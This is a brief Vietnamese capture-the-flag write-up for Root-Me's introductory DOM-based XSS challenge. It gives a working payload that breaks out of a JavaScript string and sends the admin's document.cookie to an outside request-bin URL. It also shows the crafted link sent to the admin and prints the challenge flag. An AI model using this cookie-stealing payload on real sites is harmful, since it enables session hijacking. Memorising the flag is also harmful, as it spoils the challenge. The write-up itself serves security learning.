# [XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)

## Solutions

Lỗ hổng xuất hiện ở chỗ giá trị của number parameter trong get request được đưa thẳng vào giữa cặp dấu `''` ở:

```javascript
   var number = '';
```

Tạo bin request: `https://eorumnbff82ll5r.m.pipedream.net`

Inject code: `';document.location="https://eorumnbff82ll5r.m.pipedream.net?".concat(document.cookie);//` được:

```javascript
var number = '';document.location="https://eorumnbff82ll5r.m.pipedream.net?".concat(document.cookie);// ';
```

Gửi link `http://challenge01.root-me.org/web-client/ch32/?number=';document.location="https://eorumnbff82ll5r.m.pipedream.net?".concat(document.cookie)//` cho admin, đợi một lúc sẽ lấy được FLAG

Flag: `flag=rootme{XSS_D0M_BaSed_InTr0}`

## References
